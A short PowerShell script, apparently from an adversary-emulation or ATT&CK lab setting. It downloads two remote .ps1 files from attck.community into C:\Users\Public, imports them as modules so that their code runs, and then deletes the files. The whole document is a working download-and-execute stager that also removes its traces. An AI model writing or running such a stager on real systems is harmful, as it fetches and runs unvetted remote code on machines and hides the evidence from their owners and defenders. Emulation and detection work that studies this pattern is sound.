$url="https://attck.community/AD/ad/WonTonPlatypus.ps1"
$url2="https://attck.community/AD/ad/AppleDogPeas.ps1"
$tempFilePath = "C:\Users\Public\WTP.ps1"
$tempFilePath2 = "C:\Users\Public\ADP.ps1"
Invoke-WebRequest $url -OutFile $tempFilePath
Invoke-WebRequest $url2 -OutFile $tempFilePath2
Import-Module $tempFilePath
Import-Module $tempFilePath2
Remove-Item $tempFilePath
Remove-Item $tempFilePath2